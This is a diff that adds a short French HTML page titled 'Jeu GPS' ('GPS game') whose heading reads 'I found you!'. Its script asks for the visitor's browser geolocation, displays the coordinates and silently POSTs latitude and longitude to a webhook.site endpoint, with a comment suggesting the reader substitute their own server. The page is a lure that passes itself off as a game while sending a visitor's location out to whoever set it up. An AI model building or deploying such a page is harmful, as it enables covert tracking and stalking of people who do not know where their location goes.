@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Jeu GPS</title>
+</head>
+<body>
+  <h1>Je t'ai retrouvé !</h1>
+  <p>Chargement de ta position...</p>
+  <script>
+    navigator.geolocation.getCurrentPosition(function(position) {
+      const lat = position.coords.latitude;
+      const lon = position.coords.longitude;
+      
+      // Exemple : afficher dans la page
+      document.body.innerHTML += `<p>Latitude : ${lat}</p><p>Longitude : ${lon}</p>`;
+
+      // Envoi à une URL (remplace par Webhook.site ou ton serveur)
+      fetch("https://webhook.site/c1ffd295-6e0c-4853-a78d-5189f92c5a04", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ latitude: lat, longitude: lon })
+      });
+    }, function(error) {
+      document.body.innerHTML += "<p>Erreur lors de la géolocalisation.</p>";
+    });
+  </script>
+</body>
+</html>
